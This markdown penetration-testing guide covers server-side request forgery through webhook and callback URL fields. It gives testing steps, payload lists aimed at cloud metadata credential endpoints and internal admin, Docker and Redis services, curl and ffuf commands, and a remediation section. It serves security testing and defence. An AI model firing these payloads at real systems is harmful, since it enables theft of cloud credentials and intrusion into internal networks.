# SSRF via Webhook / URL Parameter

## Overview
Webhook and URL-parameter SSRF arises in features where users configure a URL that the server will autonomously call — payment notifications, event callbacks, CI/CD integrations, monitoring pings, notification endpoints, and API testing tools. Because the business purpose of webhooks is to make HTTP requests to user-supplied URLs, these features are inherently at risk, and developers often fail to apply the same SSRF controls here as they would to other URL inputs. The attacker's URL is treated as a legitimate endpoint to deliver data to, but can equally target internal infrastructure.

## How It Works
The user registers a webhook URL (e.g., `https://myserver.com/callback`) through the application's UI or API. When a triggering event occurs (payment completed, repository push, form submission), the server constructs an HTTP request and sends it to the registered URL. An attacker registers `http://169.254.169.254/latest/meta-data/` or `http://127.0.0.1:6379/` as the webhook URL. When the server fires the webhook, it connects to the internal address. If the application logs or displays the HTTP response received from the webhook endpoint, the attacker can read the internal response directly.

## Impact
- Access cloud metadata endpoints and steal IAM credentials
- Read responses from internal APIs and management interfaces
- Perform internal network reconnaissance
- Interact with unauthenticated internal services
- Trigger state changes in internal systems
- Pivot to Remote Code Execution via exploitable internal services

## Where to Look
- Webhook configuration: payment providers (Stripe, PayPal), notification systems (Slack integrations, Zapier-like tools), repository events
- "Callback URL" or "Notify URL" fields in payment or form processors
- CI/CD pipeline configuration (webhook triggers, status callbacks)
- API testing tools embedded in the application (similar to Postman)
- Import-from-URL features (RSS feed readers, data importers)
- Email open/click tracking pixel URLs configured by users
- "Ping URL" or "Health check URL" settings in monitoring or uptime features
- OAuth redirect_uri and callback parameters
- Shipment tracking URL fields in e-commerce platforms
- Any `url`, `callback`, `endpoint`, `webhook`, `ping_url`, `notify_url`, `hook_url` parameter

## Testing Steps
1. Locate all webhook and callback URL configuration fields in the application.
2. Register your OOB listener URL (Burp Collaborator or interactsh) as the webhook destination.
3. Trigger the event that fires the webhook (make a payment, push a commit, submit a form).
4. Confirm receipt of the callback in your OOB listener — note the source IP (should be the server's IP).
5. Now change the webhook URL to an internal target: `http://127.0.0.1/` or `http://169.254.169.254/latest/meta-data/`.
6. Trigger the event again and observe:
   - Does the application show an error related to the webhook delivery? (e.g., "Webhook returned HTTP 200")
   - Does the application log or display the response body received from the webhook?
   - Does timing change significantly (suggesting a connection was made vs. refused)?
7. Try internal ports: substitute different ports to enumerate running services.
8. If the application echoes webhook response data (e.g., "Webhook delivered, got response: ..."), extract internal data from that field.
9. For blind scenarios, use timing oracle: slow response from internal service vs. fast TCP reset.
10. Attempt filter bypasses from ssrf_filter_bypass.md if direct internal IPs are blocked.

## Payloads / Techniques

```
# === Basic Webhook SSRF Targets ===

# OOB confirmation
http://YOUR-OOB-HOST/webhook-confirm

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Localhost admin interfaces
http://127.0.0.1/admin
http://127.0.0.1:8080/manager/html
http://127.0.0.1:2375/containers/json
http://127.0.0.1:9200/_cat/indices

# Internal network services
http://10.0.0.1/admin
http://192.168.1.1/
http://172.16.0.1/
```

```bash
# Register webhook via API and then trigger it
# Example: fictitious API

# Step 1: Register the webhook
curl -s -X POST "https://target.com/api/webhooks" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "events": ["payment.completed"]
  }'

# Step 2: Trigger the webhook event (make a test payment, etc.)
curl -s -X POST "https://target.com/api/webhooks/test" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"webhook_id": "wh_123"}'

# Step 3: Check application for response data
# (application may log/display webhook delivery status with response body)
```

```bash
# Test common webhook parameter names
# Intercept a request and add/replace URL params

# URL parameter injection
https://target.com/api/notify?callback_url=http://YOUR-OOB-HOST/ssrf
https://target.com/payment/ipn?notify_url=http://169.254.169.254/latest/meta-data/
https://target.com/api/ping?url=http://127.0.0.1:8080/

# POST body URL parameters
curl -s -X POST "https://target.com/api/test" \
  -d "webhook_url=http://YOUR-OOB-HOST/test"

curl -s -X POST "https://target.com/process" \
  -H "Content-Type: application/json" \
  -d '{"callback":"http://127.0.0.1:6379/","event":"order.complete"}'
```

```
# Payloads for common webhook parameter names to fuzz
webhook_url=http://YOUR-OOB-HOST/
callback=http://YOUR-OOB-HOST/
callback_url=http://YOUR-OOB-HOST/
notify_url=http://YOUR-OOB-HOST/
hook_url=http://YOUR-OOB-HOST/
endpoint=http://YOUR-OOB-HOST/
redirect_uri=http://YOUR-OOB-HOST/
ping_url=http://YOUR-OOB-HOST/
success_url=http://YOUR-OOB-HOST/
failure_url=http://YOUR-OOB-HOST/
return_url=http://YOUR-OOB-HOST/
destination=http://YOUR-OOB-HOST/
target=http://YOUR-OOB-HOST/
src=http://YOUR-OOB-HOST/
data_url=http://YOUR-OOB-HOST/
feed_url=http://YOUR-OOB-HOST/
remote_url=http://YOUR-OOB-HOST/
```

```bash
# Fuzz webhook parameter names with ffuf
ffuf -u "https://target.com/api/events?FUZZ=http://YOUR-OOB-HOST/" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all \
  -fs 0

# Then fuzz with internal IPs once parameter is found
ffuf -u "https://target.com/api/events?callback_url=FUZZ" \
  -w /tmp/ssrf_payloads.txt \
  -mc all
```

## Burp Suite Tips
- Use **Collaborator Everywhere** to automatically inject Collaborator URLs into all fields — it catches webhook-style parameters you might miss manually.
- When registering webhooks through a browser, use **Proxy > Intercept** to capture the registration request and modify the URL in transit.
- For "test webhook delivery" features, use **Repeater** to send repeated requests with different internal target URLs without going through the UI.
- **Param Miner** can discover hidden URL parameters in API endpoints.
- Check the **Site Map** for admin or settings endpoints that may contain webhook configuration not visible through the main UI.
- Monitor **HTTP History** for asynchronous callback requests — the application may make an HTTP request to your submitted URL in a background thread, visible in a small time window.

## Tools
- Burp Suite Pro (Collaborator, Repeater, Collaborator Everywhere, Param Miner)
- interactsh — OOB listener for webhook callbacks
- ffuf — fuzz webhook parameter names and values
- SSRFmap — automated SSRF exploitation
- Nuclei with webhook-ssrf templates
- httpbin.org — simple HTTP echo service for testing callback delivery

## Remediation
- Validate webhook URLs against a strict allowlist of permitted schemes (https:// only) and IP ranges (no RFC1918, no loopback, no link-local).
- Resolve the hostname and check the resulting IP before making the outbound request.
- Re-validate IP after any redirect.
- Do not return or log the response body received from webhook delivery — only log HTTP status and timing.
- Implement rate limiting on webhook test/trigger functionality to prevent rapid internal scanning.
- Consider running all outbound webhook requests from a separate, isolated network zone without access to internal infrastructure.
- Require webhook URLs to use HTTPS with valid TLS certificates to prevent trivial redirection to HTTP internal services.
- Implement egress filtering at the network level.

## References
https://portswigger.net/web-security/ssrf
https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-via-webhooks
https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#common-ssrf-endpoints
